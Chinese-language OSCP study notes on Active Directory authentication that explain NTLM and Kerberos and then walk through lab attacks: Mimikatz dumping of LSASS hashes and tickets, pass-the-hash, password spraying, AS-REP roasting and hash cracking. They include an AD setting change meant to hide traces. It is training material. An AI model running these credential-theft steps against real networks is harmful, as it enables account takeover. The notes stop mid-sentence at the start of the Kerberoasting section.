# Attacking Active Directory Authentication
首先探索 Active Directory (AD) 的身份驗證機制，了解 Windows caches authentication objects（例如密碼 hashes 和 tickets）的位置。接下來針對這些身分驗證機制的攻擊方法，來取得使用者憑證以及對系統和服務的存取權限。
## Understanding Active Directory Authentication
AD Authentication 包含：
- Understand NTLM Authentication
- Understand Kerberos Authentication
- Become familiar with cached AD Credentials

### NTLM Authentication
在 [Password Attacks](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#ntlm-vs-net-ntlmv2) 中討論了什麼是 NTLM 以及在哪裡可以找到它的 Hash。在本節中，將在 Active Directory 環境中探討 NTLM 驗證。
>[!Note]
>NTLM 主要在無法使用 Kerberos 時才會被用來身份驗證，例如：
>- 透過 IP 連線伺服器。
>- 伺服器 未註冊在 AD DNS。
>- 某些第三方應用仍然使用 NTLM。

####  NTLM 驗證流程（7 個步驟）
![image](https://hackmd.io/_uploads/H19MNKao1x.png)
1. 計算 NTLM Hash
使用者輸入密碼後，電腦會將其轉換為 NTLM Hash。
2. 用戶端傳送使用者名稱至伺服器
伺服器不會收到密碼本身，而是先收到 Username。
3. 伺服器產生隨機數（nonce/challenge）並回傳
伺服器生成一個隨機挑戰值（nonce），並回傳給用戶端。
4. 用戶端使用 NTLM Hash 加密 nonce 並傳送回伺服器
這個 加密後的 nonce（稱為 response） 會被送回伺服器。
5. 伺服器將 response、nonce 及 Username 傳送至 Domain Controller
DC（Domain Controller）負責進一步驗證。
6. DC 使用 NTLM Hash 加密 nonce 並比對 response
DC 內建用戶 NTLM Hash，會使用該 Hash 加密 nonce，並與伺服器的 response 進行比對。
7. 如果比對成功，則通過身份驗證
如果兩者相符，驗證成功；否則，拒絕登入。

>[!Tip]
>NTLM 的安全性問題:
>- 無法反向破解：
>NTLM 是一種 `單向 Hash 算法`，無法直接從雜湊值逆推出原始密碼。
>- 計算速度快，容易被破解：
NTLM 缺乏 Salt，使其雜湊值對於相同的密碼來說都是固定的，暴力破解更容易。
>>使用 Hashcat + 高效能 GPU，可以每秒測試 6000 億個 NTLM Hash\
8 字元的密碼在 2.5 小時內破解\
9 字元的密碼在 11 天內破解

### Kerberos Authentication
Kerberos 是一種 基於 Ticket 的認證協議，從 Windows Server 2003 開始採用為 Windows 的主要身份驗證機制\
與 NTLM 直接與伺服器互動不同，Kerberos 的認證流程 需要透過 Domain Controller 作為 金鑰發放中心（[Key Distribution Center](https://en.wikipedia.org/wiki/Key_distribution_center), KDC） 來管理身份驗證。
#### Kerberos 認證流程
Kerberos 的認證包含 三個主要階段，涉及 四個請求回應（`AS-REQ` / `AS-REP` / `TGS-REQ` / `TGS-REP`）和最終的 應用程式請求（`AP-REQ`）。
![image](https://hackmd.io/_uploads/rkOIaYajkx.png)

##### 第一階段：身份驗證請求（AS-REQ / AS-REP）
1. 用戶登入後，發送 AS-REQ（Authentication Server Request）
當用戶在 workstation 上輸入密碼，系統會計算密碼的 `NTLM Hash` 並使用這個 Hash 加密一個 `timestamp`。這個請求會發送到 DC，並由 KDC 的驗證伺服器（AS, Authentication Server）處理。

2. KDC 驗證用戶並回應 AS-REP（Authentication Server Reply）
DC 會從 [ntds.dit](https://attack.mitre.org/techniques/T1003/003/) 文件中檢索用戶的 NTLM Hash，並嘗試解密 timestamp。\
如果解密成功，並且 timestamp 不是重複的（避免 potential replay attack），則身份驗證成功。\
DC 會返回 一張「`Ticket Granting Ticket` (TGT)」和「`Session Key`」 給用戶：
>`TGT` 是用 [KRBTGT](https://adsecurity.org/?p=483) 帳戶的 NTLM Hash 加密的，因此只有 DC 能夠解密。\
>`Session Key` 用戶可以使用，並在後續步驟中使用 TGT 來請求服務存取。
>>TGT 預設有效期為 10 小時，之後可自動續約，不需要重新輸入密碼。

##### 第二階段：獲取服務存取權（TGS-REQ / TGS-REP）
3. 用戶發送 TGS-REQ（Ticket Granting Service Request）
當用戶要存取特定的 AD 服務（例如 network share 或 mailbox），它會：\
使用 Session Key 加密 `TGT` 和 `timestamp`，並請求特定服務的存取權。
4. KDC 回應 TGS-REP（Ticket Granting Service Reply）
DC 會解密 TGT 來驗證身份，並檢查請求的資源是否存在。\
如果成功，DC 會提供一張 `Service Ticket`：
包含 username、group memberships 資格和新的 Session Key。
> Service Ticket 是用該服務的帳戶密碼 Hash 加密的，因此只有該服務能夠解密。

##### 第三階段：服務驗證（AP-REQ）
5. 用戶發送 AP-REQ（Application Request）給應用伺服器
用戶向 Application server（如 file share、SQL Server）提交請求，包含：\
(1)Session Key 加密的 `username` 和 `timestamp`\
(2)加密的 `Service Ticket`。
6. 應用伺服器驗證請求
伺服器 使用自己的 NTLM Hash 解密 Service Ticket，獲取用戶資訊與 Session Key。\
比對 AP-REQ 的 `username` 與 `Service Ticket 中的 username`。
如果匹配，則授權用戶存取該應用程式或資源。

#### NTLM vs. Kerberos 認證比較
- | NTLM | Kerberos |
:------:|:---------------------|:---------------------|
身份驗證方式| Challenge-Response | Ticket-based
密碼傳輸 | 直接使用 NTLM Hash | 使用 TGT 和 Service Ticket
安全性 | 脆弱，易受 Hash 攻擊 | 更安全，避免密碼傳輸
適用場景 | 單獨伺服器或無法使用 Kerberos 的情況| AD 環境，預設身份驗證方式

### Cached AD Credentials
AD 的 Cached Credentials，並利用 Mimikatz 提取 Windows 記憶體中的密碼 Hash 與 Kerberos Ticket，進而進行攻擊或 Lateral Movement\
####  AD 快取密碼
在 Windows 網域環境 中，Kerberos 認證機制透過 Single Sign-On (SSO) 讓 user 不需要反覆輸入密碼。然而為了讓 TGT（Ticket Granting Ticket） 可以在有效期內自動續約，Windows 需要 快取使用者的密碼雜湊，而這些資訊會儲存在 LSASS（[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)）process 的記憶體內。

如果能夠 存取 LSASS 記憶體，就可以取得 `NTLM Hash` 或 `Kerberos Ticket` 來執行進一步的攻擊。

#### 1. Mimikatz 提取密碼雜湊
##### 1.1 RDP 連線並啟用 Mimikatz
jeff domain user 是 CLIENT75 的 local administrator，所以可以在本機提權
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.208.75
```
(Powershell): Run as Administrator
```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK
```
> 啟用 SeDebugPrivilege 權限，讓 Mimikatz 具備存取 LSASS 記憶體 的權限。

##### 1.2 提取所有已登入使用者的密碼雜湊
```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        tspkg :
        wdigest :
         * Username : jeff
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 1:32:23 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
```
> jeff:
> - NTLM Hash = `2688c6d2af5e9c7ddb268899123744ea`
> - SHA1 Hash = `f57d987a25f39a2887d158e8d5ac41bc8971352f`
>
> dave:
> - NTLM Hash = `08d7a47a6f9f66b97b1bae4178747494`
> - SHA1 Hash = `a0c2285bfad20cc614e2d361d6246579843557cd`

>[!Tip]
>對於 Windows 2003 的 AD instances，NTLM 是唯一可用的雜湊演算法。🥚 對於執行 Windows Server 2008 或更高版本的實例，`NTLM` 和 `SHA-1` 可能都可用。\
>在 Windows 7 等較舊的作業系統或手動設定的作業系統上，`WDigest 11`會處於啟用狀態。啟用 WDigest 時，執行 Mimikatz 會顯示明文密碼以及密碼雜湊值。

#### - 利用 NTLM Hash
可參考 Password Attacks 章節
- Offline Cracking
```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 1000 jeff.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
- pass-the-hash (PtH)
```
mimikatz # sekurlsa::pth /user:jeff /domain:corp.com /ntlm:2688c6d2af5e9c7ddb268899123744ea /run:powershell.exe
```

#### 2. Mimikatz 提取 Kerberos Ticket
##### 2.1 訪問共享資料夾，觸發 Kerberos Ticket 存儲
WEB04 上 UNC 路徑為\\web04.corp.com\backup 的SMB 共享的內容
```
PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```
> 讓系統產生一個 TGS（Service Ticket），並快取於 LSASS
##### 2.2 用 Mimikatz 提取 Kerberos Ticket
使用 Mimikatz 透過 `sekurlsa::tickets` 顯示儲存在記憶體中的 Ticket
```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```
> 表示 jeff 在 web04.corp.com 伺服器上有一張存取權限的 Kerberos 票據。\
透過這張 ticket ，攻擊者可以 冒充 jeff，進行 SMB 存取或其他操作(如 Pass-The-Ticket)

>[!Important]
**如何利用 ticket 進行攻擊**
>1. 竊取 TGS：
>- 只允許存取特定的服務。
>- Pass-the-Ticket（PTT）攻擊：直接使用竊取的 TGS 來存取受保護資源。
>2. 竊取 TGT：
>- 允許攻擊者偽裝成目標使用者，請求新的 TGS 來存取 任意資源。
>- Golden Ticket 攻擊：偽造 TGT 來完全掌控 AD 網域。
>3. Mimikatz 票據提取與注入：
>- Export：將 TGT/TGS ticket 存儲到硬碟。
>- Inject：將 TGT/TGS 重新導入 LSASS 記憶體，從而在目標機器上模擬受害者身份。

## Performing Attacks on Active Directory Authentication
介紹針對 Active Directory（AD）身份驗證 的各種攻擊方法
### Password Attacks (Password Spraying)
在 AD 環境中，過於頻繁的密碼錯誤輸入可能會導致帳戶鎖定，引起系統管理員的警覺。因此，需要使用密碼噴灑攻擊來測試大量帳戶，使用少量常見密碼來嘗試登入，而不是對單一帳戶進行暴力破解。\
可以從 `net accounts` 取得的資訊:
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.151.75
```
```
PS C:\Windows\system32> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```
> `Lockout threshold`：連續 5 次錯誤輸入密碼，會導致帳戶鎖定\
`Lockout duration`：30 分鐘後解除鎖定\
`Lockout observation window`：30 分鐘內錯誤超過 5 次才會觸發鎖定\
>>表示可以每 30 分鐘內嘗試 4 次錯誤密碼輸入\
>>可以在 24 小時內對每個網域使用者嘗試 192 次登錄

#### 1. 使用 LDAP 和 ADSI（低速、隱蔽）
透過 LDAP 協議與 ADSI（Active Directory Service Interfaces） 進行身份驗證。低速但較隱蔽，不會產生大量網路流量。\
在 [Active Directory - Manual Enumeration](#Adding-Search-Functionality-to-our-Script) 章節中，使用 DirectoryEntry 對 Domain controller 進行查詢\
透過 DirectoryEntry  Object 來測試帳戶密碼是否正確：
```
PS C:\Windows\system32> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
PS C:\Windows\system32> $PDC = ($domainObj.PdcRoleOwner).Name
PS C:\Windows\system32> $SearchString = "LDAP://"
PS C:\Windows\system32> $SearchString += $PDC + "/"
PS C:\Windows\system32> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
PS C:\Windows\system32> $SearchString += $DistinguishedName
PS C:\Windows\system32> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```
>`GetCurrentDomain()`：取得當前 Windows 設備所屬的 AD 網域資訊\
>`PdcRoleOwner`：取得 Primary Domain Controller (PDC) 的名稱\
>`LDAP://$PDC/DC=corp,DC=com`: 組合 LDAP 路徑\
>創建 System.DirectoryServices.DirectoryEntry：\
`$SearchString`：LDAP 路徑，指定要查詢的 AD 網域。
"pete"：測試登入的 AD 使用者名稱。
"Nexus123!"：測試用的密碼。
>> object 建立，代表密碼正確

若密碼不正確，會顯示 password incorrect\
![image](https://hackmd.io/_uploads/SyaC9yAo1g.png)

#### 撰寫腳本
可以使用現成的 [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
```
PS C:\Tools> powershell -ep bypass
PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```
> 提供了兩組有效的憑證，密碼為 `Nexus123！`

#### 2. 使用 SMB（傳統方法、較為顯眼）
透過 SMB（Server Message Block）協議驗證帳戶，每次嘗試都會建立完整的 SMB 連線，因此網路流量較大。\
使用 [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec) 工具（Kali Linux）：
```
┌──(chw㉿CHW)-[~]
└─$ cat users.txt                                       
dave
jen
pete

┌──(chw㉿CHW)-[~]
└─$ crackmapexec smb 192.168.151.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.151.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.151.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
SMB         192.168.151.75  445    CLIENT75         [-] corp.com\pete:Nexus123! STATUS_ACCOUNT_LOCKED_OUT 

```
> `-d corp.com`: 設定目標 AD Domain\
`--continue-on-success`: 讓工具在找到有效帳戶後繼續測試

crackmapexec 在開始 password spraying 之前不會檢查網域的密碼策略。因此，我們應該謹慎使用這種方法鎖定使用者帳戶

假設 dave 是 CLIENT75 上的本機管理員。讓我們使用 crackmapexec 和密碼 Flowers1 來瞄準這台機器
```
┌──(chw㉿CHW)-[~]
└─$ crackmapexec smb 192.168.151.75 -u dave -p 'Flowers1' -d corp.com
SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.151.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
```
> `Pwn3d!` 表示擁有本機管理員權限

#### 3. 使用 Kerberos（最快速、低噪音）
基於取得 TGT。
Kerberos 驗證只需要發送 兩個 UDP frames（AS-REQ），比起 LDAP 和 SMB 方法更快、更安靜。\
使用 [kerbrute](https://github.com/ropnop/kerbrute) 工具（Windows 版）：
```
PS C:\Tools> type .\users.txt
pete
dave
jen

PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\users.txt "Nexus123!"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/11/25 - Ronnie Flathers @ropnop

2025/03/11 10:41:59 >  Using KDC(s):
2025/03/11 10:41:59 >   dc1.corp.com:88
2025/03/11 10:41:59 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2025/03/11 10:41:59 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2025/03/11 10:41:59 >  Done! Tested 3 logins (2 successes) in 0.053 seconds
```

>[!Note]
>Q: Spray the credentials of pete against all domain joined machines with crackmapexec. On which machine is pete a local administrator?\
>Ans:
>```
>┌──(chw㉿CHW)-[~]
>└─$ crackmapexec smb 192.168.151.0/24 -u pete -p 'Nexus123!' -d corp.com
>SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
>SMB         192.168.151.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
>SMB         192.168.151.72  445    WEB04            [+] corp.com\pete:Nexus123! 
>SMB         192.168.151.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
>SMB         192.168.151.73  445    FILES04          [+] corp.com\pete:Nexus123! 
>SMB         192.168.151.76  445    CLIENT76         [+] corp.com\pete:Nexus123! (Pwn3d!)
>SMB         192.168.151.70  445    DC1              [+] corp.com\pete:Nexus123!
>```

### AS-REP Roasting
在 Kerberos 認證過程 中，當用戶發送 AS-REQ（Authentication Server Request） 給 Doamin Cotroller 進行身份驗證時，預先驗證（[Kerberos preauthentication](https://learn.microsoft.com/en-us/archive/technet-wiki/23559.kerberos-pre-authentication-why-it-should-not-be-disabled)） 會防止攻擊者發送偽造的 AS-REQ 來進行密碼爆破。\
但如果 "Do not require Kerberos preauthentication" 選項啟用了，attacker 可以代表任何 AD 使用者向 DC 發送 AS-REQ，然後離線破解其加密部分來取得密碼。
>[!Note]
>AS-REP Roasting 攻擊流程：
>- 攻擊者發送 AS-REQ（不需密碼）：請求 DC 返回 AS-REP。
>- DC 返回 AS-REP：其中包含 TGT（Ticket Granting Ticket）以及密碼雜湊值（AS-REP Hash）。
>- 擷取 AS-REP Hash，使用 Hashcat 進行 離線破解，以獲取明文密碼。

#### 1. 使用 Kali 進行 AS-REP Roasting
透過 `impacket-GetNPUsers` 來執行 AS-REP Roasting\
使用上章節中，取得的 `pete`/`Nexus123!`執行
```
┌──(chw㉿CHW)-[~]
└─$ impacket-GetNPUsers -dc-ip 192.168.181.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2025-03-12 02:57:28.456885  0x410200 

$krb5asrep$23$dave@CORP.COM:693a3d75a0b29dc937dfd4fbf165ba73$75c9a64596b10b6a2b85ff036462f1f72aae8af73d5c8e01621a829329095f6a4862123d3a1a17b2879c645745335cf0d37d2f654550a10d46b960499d5a766e37daa26787e9e4860ebf97641947f447c5f1c76449cdd63f812171b4e2e88df7414c48959c6bb83a6f5f98fe8eda87a74f78c7481a34e32496ef04590bd4b30be7727691f76737e77a9d334ba6b6830beb97ae3a48006fa7a9a9a3fb62cecb5b3a0536eee203ec33162fae27a447ebc296eafb0b9cdbaa18478d8d1afcac20665b8ae32cde61d19f3b7094ab0d829c6ab58afbd9ebb93d9f3d1210229aba178bc8238773
```
>`-dc-ip`：指定 Domain Controller 的 IP\
`-request`：請求 AS-REP\
`-outputfile`：將取得的雜湊值儲存至 hashes.asreproast 以便破解。
`corp.com/pete`：目標 Domain 和 username
>> dave 帳戶選項不需要啟用 Kerberos preauthentication\
>> (可以爆破)

#### 1-1 使用 Hashcat 破解 AS-REP Hash
查詢 Hashcat 模式
```
┌──(chw㉿CHW)-[~]
└─$ hashcat --help | grep -i "Kerberos"
  ...
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```
> AS-REP 使用 18200 Mode

開始破解 AS-REP Hash
```
┌──(chw㉿CHW)-[~]
└─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
[sudo] password for chw: 
hashcat (v6.2.6) starting

...

$krb5asrep$23$dave@CORP.COM:693a3d75a0b29dc937dfd4fbf165ba73$75c9a64596b10b6a2b85ff036462f1f72aae8af73d5c8e01621a829329095f6a4862123d3a1a17b2879c645745335cf0d37d2f654550a10d46b960499d5a766e37daa26787e9e4860ebf97641947f447c5f1c76449cdd63f812171b4e2e88df7414c48959c6bb83a6f5f98fe8eda87a74f78c7481a34e32496ef04590bd4b30be7727691f76737e77a9d334ba6b6830beb97ae3a48006fa7a9a9a3fb62cecb5b3a0536eee203ec33162fae27a447ebc296eafb0b9cdbaa18478d8d1afcac20665b8ae32cde61d19f3b7094ab0d829c6ab58afbd9ebb93d9f3d1210229aba178bc8238773:Flowers1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$dave@CORP.COM:693a3d75a0b29dc937dfd4f...238773
...
```
> `-m 18200`：指定 AS-REP 的破解模式\
`hashes.asreproast`：爆破的雜湊值目標\
`/usr/share/wordlists/rockyou.txt`：使用 rockyou.txt 字典破解\
`-r best64.rule`：應用 密碼變化規則（rules）\
`--force`：強制運行（避免記憶體不足問題）
>> 破解 dave 的密碼: `Flowers1`

#### 2. 在 Windows 上使用 Rubeus 進行 AS-REP Roasting
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
```
在 Windows 上使用 `Rubeus.exe` 來執行 AS-REP Roasting
```
PS C:\Users\jeff> cd C:\Tools\
PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.181.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:D5ADB48036691D9D977925CE12B7B7CA$9A913D14714D6457B01F51D613FEB6CC2E8CFD88D1DF0B920416BA3F60137408F59F5BCD062BC267F8D8FF47F2F529BC8721A156AD3CF5E05D47A663473DECAB955C3D24E29DA09A659CB96839FECA810CF6938F8E8AE98B5116C85CC36A454D7E465B82F600276010A618CBB1EC36509DB234837B83C3AE6BE117AC9F204F3F2A91D2C3A4577E89596F4A4EEB6A7879F7A1D9D803422C967483632E5FCC946E7CDAB5C1C1CC2791F77D0C741F039739B6D6092053EF1CAB73E4C2D327B08CF846886F6CDBC81E7BB1AB991F840C8B8CB0FFE7EAC30E7B73014C6F614747E0AC31AE9AC0
```
>`asreproast`: Rubeus 的一個子命令，專門用來執行 AS-REP Roasting\
`/nowrap`: 防止換行，讓輸出的 AS-REP Hash 保持在同一行
>> 確認 dave 啟用了 "Do not require Kerberos preauthentication"

#### 2-1 複製 Hash 回 Kali，使用 Hashcat 破解
```
┌──(chw㉿CHW)-[~]
└─$ vi hashes.asreproast2 
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
#### - 透過 PowerView 找出無需 Kerberos preauthentication 的帳戶
- Windows
```
PS C:\Tools> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> Get-DomainUser -PreauthNotRequired


logoncount            : 65535
badpasswordtime       : 10/18/2022 8:05:18 PM
distinguishedname     : CN=dave,CN=Users,DC=corp,DC=com
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 3/11/2025 11:37:28 PM
name                  : dave
objectsid             : S-1-5-21-1987370270-658905905-1781884369-1103
samaccountname        : dave
codepage              : 0
samaccounttype        : USER_OBJECT
```
- Kali
```
impacket-GetNPUsers corp.com/ -dc-ip 192.168.181.70
```
#### 3. 進階攻擊：Targeted AS-REP Roasting
如果無法找到啟用了 "Do not require Kerberos preauthentication" 的帳戶，但我們擁有某個用戶的 GenericWrite 或 GenericAll 權限，可以手動修改其 UserAccountControl 來啟用此選項，然後對該帳戶執行 AS-REP Roasting。
- 啟用 AS-REP Roasting
```
Set-DomainObject -Identity "victim" -Set @{'userAccountControl'='4194304'}
```
> 將 `victim` user 的 UserAccountControl 設為 `4194304` 以禁用 Kerberos 預先驗證
- 破解密碼後還原設定
```
Set-DomainObject -Identity "victim" -Set @{'userAccountControl'='512'}
```
>  將 `victim` 的 UserAccountControl 設回 `512`（預設值）以掩蓋攻擊痕跡

### Kerberoasting
Kerberoasting 是一種針對 Kerberos 認證機制 的攻擊方法，目標是從 AD 取得 Service Principal Name (SPN) Service Ticket (TGS-REP) 並破解密碼。\
透過這種方法可以：\
